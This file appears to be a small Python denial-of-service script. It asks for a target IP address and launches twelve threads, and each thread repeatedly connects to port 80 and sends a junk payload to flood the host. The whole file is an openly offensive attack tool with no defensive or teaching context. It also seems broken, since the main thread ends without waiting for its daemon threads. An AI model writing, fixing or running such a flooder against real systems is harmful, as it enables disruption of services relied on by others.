import os, colorama, threading, socket
from termcolor import colored

colorama.init()

ip = input(colored("IP Address => ",'red'))

def startAttack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        msg = b"148ewqhtuoiewyu489eui8yuasr8ruis6uyt9e8r5ieru7ysa89rti148ewqhtuoiewyu489eui8yuasr8ruis6uyt9e8r5ieru7ysa89rti148ewqhtuoiewyu489eui8yuasr8ruis6uyt9e8r5ieru7ysa89rti148ewqhtuoiewyu489eui8yuasr8ruis6uyt9e8r5ieru7ysa89rti148ewqhtuoiewyu489eui8yuasr8ruis6uyt9e8r5ieru7ysa89rti148ewqhtuoiewyu489eui8yuasr8ruis6uyt9e8r5ieru7ysa89rti148ewqhtuoiewyu489eui8yuasr8ruis6uyt9e8r5ieru7ysa89rti148ewqhtuoiewyu489eui8yuasr8ruis6uyt9e8r5ieru7ysa89rti148ewqhtuoiewyu489eui8yuasr8ruis6uyt9e8r5ieru7ysa89rti148ewqhtuoiewyu489eui8yuasr8ruis6uyt9e8r5ieru7ysa89rti148ewqhtuoiewyu489eui8yuasr8ruis6uyt9e8r5ieru7ysa89rti148ewqhtuoiewyu489eui8yuasr8ruis6uyt9e8r5ieru7ysa89rti"
        try:
            s.connect((ip, 80))
            s.send(msg)
            s.sendto(msg, (ip, 80) )
            s.send(msg)
            print(colored("[",'red'), ip, colored("]",'red'), f"Sent packets")
        except Exception as e:
            print(colored("[",'red'), ip, colored("]",'red'), f"Failed to connect: {e}")

thread1 = threading.Thread(target=startAttack, daemon=True)
thread2 = threading.Thread(target=startAttack, daemon=True)
thread3 = threading.Thread(target=startAttack, daemon=True)
thread4 = threading.Thread(target=startAttack, daemon=True)
thread5 = threading.Thread(target=startAttack, daemon=True)
thread6 = threading.Thread(target=startAttack, daemon=True)
thread7 = threading.Thread(target=startAttack, daemon=True)
thread8 = threading.Thread(target=startAttack, daemon=True)
thread9 = threading.Thread(target=startAttack, daemon=True)
thread10 = threading.Thread(target=startAttack, daemon=True)
thread11 = threading.Thread(target=startAttack, daemon=True)
thread12 = threading.Thread(target=startAttack, daemon=True)

thread1.start()
thread2.start()
thread3.start()
thread4.start()
thread5.start()
thread6.start()
thread7.start()
thread8.start()
thread9.start()
thread10.start()
thread11.start()
thread12.start()